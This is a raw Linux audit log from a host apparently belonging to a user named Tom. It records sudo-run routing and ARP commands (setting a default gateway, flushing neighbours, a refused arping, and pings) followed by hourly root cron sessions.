type=USER_END msg=audit(1789399291.750:103): pid=820 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789399291.750:104): pid=820 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789399318.818:105): arch=c000003e syscall=59 success=yes exit=0 a0=561659909990 a1=56165990b9d0 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=823 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789399318.818:105): argc=9 a0="sudo" a1="ip" a2="route" a3="replace" a4="devault" a5="via" a6="192.168.0.254" a7="dev" a8="eth0"
type=CWD msg=audit(1789399318.818:105): cwd="/home/Tom"
type=PATH msg=audit(1789399318.818:105): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399318.818:105): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399318.818:105): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789399318.818:105): proctitle=7375646F00697000726F757465007265706C6163650064657661756C7400766961003139322E3136382E302E323534006465760065746830
type=USER_ACCT msg=audit(1789399318.822:106): pid=823 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789399318.822:107): pid=823 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=697020726F757465207265706C6163652064657661756C7420766961203139322E3136382E302E323534206465762065746830 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789399318.822:108): pid=823 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789399318.822:109): pid=823 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789399318.830:110): pid=823 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789399318.830:111): pid=823 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789399329.686:112): arch=c000003e syscall=59 success=yes exit=0 a0=5616598941b0 a1=56165990b9d0 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=828 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789399329.686:112): argc=9 a0="sudo" a1="ip" a2="route" a3="replace" a4="default" a5="via" a6="192.168.0.254" a7="dev" a8="eth0"
type=CWD msg=audit(1789399329.686:112): cwd="/home/Tom"
type=PATH msg=audit(1789399329.686:112): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399329.686:112): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399329.686:112): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789399329.686:112): proctitle=7375646F00697000726F757465007265706C6163650064656661756C7400766961003139322E3136382E302E323534006465760065746830
type=USER_ACCT msg=audit(1789399329.694:113): pid=828 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789399329.694:114): pid=828 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=697020726F757465207265706C6163652064656661756C7420766961203139322E3136382E302E323534206465762065746830 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789399329.694:115): pid=828 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789399329.694:116): pid=828 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789399329.698:117): pid=828 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789399329.698:118): pid=828 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789399340.966:119): arch=c000003e syscall=59 success=yes exit=0 a0=5616599050e0 a1=5616598aa730 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=831 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ip" exe="/usr/bin/ip" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789399340.966:119): argc=3 a0="ip" a1="-br" a2="addr"
type=CWD msg=audit(1789399340.966:119): cwd="/home/Tom"
type=PATH msg=audit(1789399340.966:119): item=0 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399340.966:119): item=1 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399340.966:119): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789399340.966:119): proctitle=6970002D62720061646472
type=SYSCALL msg=audit(1789399363.106:120): arch=c000003e syscall=59 success=yes exit=0 a0=561659904550 a1=561659845f80 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=832 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ip" exe="/usr/bin/ip" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789399363.106:120): argc=2 a0="ip" a1="route"
type=CWD msg=audit(1789399363.106:120): cwd="/home/Tom"
type=PATH msg=audit(1789399363.106:120): item=0 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399363.106:120): item=1 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399363.106:120): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789399363.106:120): proctitle=697000726F757465
type=SYSCALL msg=audit(1789399402.962:121): arch=c000003e syscall=59 success=yes exit=0 a0=561659909bc0 a1=56165990b910 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=833 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789399402.962:121): argc=6 a0="sudo" a1="ip" a2="neigh" a3="flush" a4="dev" a5="eth0"
type=CWD msg=audit(1789399402.962:121): cwd="/home/Tom"
type=PATH msg=audit(1789399402.962:121): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399402.962:121): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399402.962:121): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789399402.962:121): proctitle=7375646F006970006E6569676800666C757368006465760065746830
type=USER_ACCT msg=audit(1789399402.970:122): pid=833 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789399402.970:123): pid=833 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=6970206E6569676820666C757368206465762065746830 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789399402.970:124): pid=833 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789399402.970:125): pid=833 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789399402.982:126): pid=833 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789399402.982:127): pid=833 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789399435.126:128): arch=c000003e syscall=59 success=yes exit=0 a0=5616597f77f0 a1=561659901d10 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=836 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789399435.126:128): argc=7 a0="sudo" a1="arping" a2="-I" a3="eth0" a4="-c" a5="5" a6="192.168.0.254"
type=CWD msg=audit(1789399435.126:128): cwd="/home/Tom"
type=PATH msg=audit(1789399435.126:128): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399435.126:128): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399435.126:128): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789399435.126:128): proctitle=7375646F00617270696E67002D490065746830002D630035003139322E3136382E302E323534
type=USER_ACCT msg=audit(1789399435.134:129): pid=836 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789399435.134:130): pid=836 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=617270696E67202D492065746830202D632035203139322E3136382E302E323534 exe="/usr/bin/sudo" terminal=tty1 res=failed'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789399458.058:131): arch=c000003e syscall=59 success=yes exit=0 a0=5616598454f0 a1=561659907110 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=838 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ping" exe="/usr/bin/ping" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=BPRM_FCAPS msg=audit(1789399458.058:131): fver=2 fp=0000000000002000 fi=0 fe=1 old_pp=0 old_pi=0 old_pe=0 old_pa=0 pp=0000000000002000 pi=0 pe=0000000000002000 pa=0 frootid=0
type=EXECVE msg=audit(1789399458.058:131): argc=2 a0="ping" a1="192.168.0.254"
type=CWD msg=audit(1789399458.058:131): cwd="/home/Tom"
type=PATH msg=audit(1789399458.058:131): item=0 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399458.058:131): item=1 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789399458.058:131): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789399458.058:131): proctitle=70696E67003139322E3136382E302E323534
type=SYSCALL msg=audit(1789400764.530:132): arch=c000003e syscall=59 success=yes exit=0 a0=561659904f20 a1=561659902e60 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=846 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ping" exe="/usr/bin/ping" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=BPRM_FCAPS msg=audit(1789400764.530:132): fver=2 fp=0000000000002000 fi=0 fe=1 old_pp=0 old_pi=0 old_pe=0 old_pa=0 pp=0000000000002000 pi=0 pe=0000000000002000 pa=0 frootid=0
type=EXECVE msg=audit(1789400764.530:132): argc=2 a0="ping" a1="192.168.0.254"
type=CWD msg=audit(1789400764.530:132): cwd="/home/Tom"
type=PATH msg=audit(1789400764.530:132): item=0 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789400764.530:132): item=1 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789400764.530:132): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789400764.530:132): proctitle=70696E67003139322E3136382E302E323534
type=USER_ACCT msg=audit(1789402621.162:133): pid=855 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789402621.162:134): pid=855 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789402621.162:135): pid=855 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=4 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789402621.162:135): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=855 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789402621.162:135): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789402621.162:136): pid=855 uid=0 auid=0 ses=4 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789402621.166:137): pid=856 uid=0 auid=0 ses=4 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789402621.166:138): pid=855 uid=0 auid=0 ses=4 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789402621.166:139): pid=855 uid=0 auid=0 ses=4 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789406221.185:140): pid=872 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789406221.185:141): pid=872 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789406221.185:142): pid=872 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=5 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789406221.185:142): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=872 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=5 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789406221.185:142): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789406221.185:143): pid=872 uid=0 auid=0 ses=5 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789406221.189:144): pid=873 uid=0 auid=0 ses=5 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789406221.189:145): pid=872 uid=0 auid=0 ses=5 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789406221.189:146): pid=872 uid=0 auid=0 ses=5 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789409821.209:147): pid=893 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789409821.209:148): pid=893 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789409821.209:149): pid=893 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=6 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789409821.209:149): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=893 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=6 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789409821.209:149): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789409821.209:150): pid=893 uid=0 auid=0 ses=6 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789409821.213:151): pid=894 uid=0 auid=0 ses=6 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789409821.217:152): pid=893 uid=0 auid=0 ses=6 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789409821.217:153): pid=893 uid=0 auid=0 ses=6 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789413421.237:154): pid=912 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789413421.237:155): pid=912 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789413421.237:156): pid=912 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=7 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789413421.237:156): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=912 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=7 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789413421.237:156): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789413421.237:157): pid=912 uid=0 auid=0 ses=7 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
